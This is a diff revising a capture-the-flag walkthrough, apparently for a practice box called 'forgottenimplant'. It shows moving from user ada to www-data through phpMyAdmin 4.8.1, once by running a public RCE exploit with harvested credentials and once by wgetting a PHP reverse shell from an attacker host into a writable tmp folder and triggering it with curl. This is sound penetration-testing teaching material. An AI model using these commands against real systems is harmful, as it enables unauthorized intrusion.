@@ -324,9 +324,13 @@ There is a python file in fi's home named `sniffer.py`. This is the code that de
 
 We seem to have run out of likely paths to become fi, let’s look for another option. 
 
-Running `curl 127.0.0.1` we see phpMyAdmin on port 80. 
+Running `curl 127.0.0.1` we see phpMyAdmin version 4.8.1 on port 80. 
+
+There are (at least) two paths we can take from here.
 
 ### Intended Path
+
+A quick search identifies an RCE for this version of phpMyAdmin. 
 
 ```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
@@ -344,19 +348,20 @@ Shellcodes: No Results
 └─$              
 ```
 
-upload and run
+We upload the exploit file and run it with the credentials that we found in ada's python file earlier. 
 ```bash
 ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app s4Ucbrme id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
-We can upload our shell of choice and call it with this script to obtain a new shell as www-data.
+
+The exploit seems to work. We can upload our shell of choice and call it with this script to obtain a new shell as www-data.
 
 ### Alternate Path
 
 In most challenges we’re trying to elevate OUT of the www-data account, lets look for an easier way in considering we already have a shell.
 
-Enumerating `/var/www/phpmyadmin` we see we can write to the `tmp` folder.
+Enumerating `/var/www/phpmyadmin` we see we can write to the `tmp` folder:
 
 ```bash
 cd phpmyadmin/
@@ -369,8 +374,6 @@ drwxr-xr-x  4 root     root       4096 Jul 12  2022 ..
 
 [...]
 
-drwxrwxr-x 19 www-data www-data   4096 May 25  2018 templates
-drwxrwxr-x  6 www-data www-data   4096 May 25  2018 test
 drwxrwxr-x  4 www-data www-data   4096 May 25  2018 themes
 -rw-rw-r--  1 www-data www-data    956 May 25  2018 themes.php
 drwxrwxrwx  3 www-data www-data   4096 Jul 12  2022 tmp
@@ -386,7 +389,7 @@ drwxr-xr-x 25 www-data www-data   4096 Jul 12  2022 vendor
 ada@forgottenimplant:/var/www/phpmyadmin$
 ```
 
-A quick test to prove that the folder is accessable:
+We'll create a file and try to call it through `curl` as a quick test to prove that the folder is accessable:
 
 ```bash
 ada@forgottenimplant:/var/www/phpmyadmin$ echo "hello" > tmp/hi.html
@@ -396,7 +399,7 @@ ada@forgottenimplant:/var/www/phpmyadmin$ curl 127.0.0.1/tmp/hi.html
 hello
 ```
 
-Looks good. Let’s upload a PHP shell and trigger it with curl:
+Looks good. Let’s start a new listener, upload a PHP shell and trigger it with `curl`:
 
 ```bash
 ada@forgottenimplant:/var/www/phpmyadmin/tmp$ wget 10.6.74.177/shell.php
@@ -414,9 +417,11 @@ shell.php           100%[===================>]   5.36K  --.-KB/s    in 0.001s
 ada@forgottenimplant:/var/www/phpmyadmin/tmp$ curl 127.0.0.1/tmp/shell.php
 ```
 
-With the above we receive a connection back in our new shell as www-data.
+With the above we receive a connection back to our new listener as www-data.
 
 ## Become root
+
+A quick enumeration proves that our migration to www-data was worthwile:
 
 ```bash
 $ sudo -l
